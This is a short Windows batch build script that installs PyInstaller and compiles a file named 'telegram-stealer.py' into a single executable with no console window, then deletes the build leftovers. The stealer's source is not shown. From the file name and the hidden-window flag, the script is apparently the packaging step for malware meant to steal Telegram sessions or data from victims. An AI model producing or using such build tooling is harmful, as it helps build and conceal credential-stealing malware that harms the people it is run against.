echo off

pip install pyinstaller
pyinstaller --clean --onefile --noconsole telegram-stealer.py

del /s /q /f telegram-stealer.spec
rmdir /s /q __pycache__
rmdir /s /q build

:cmd
pause null
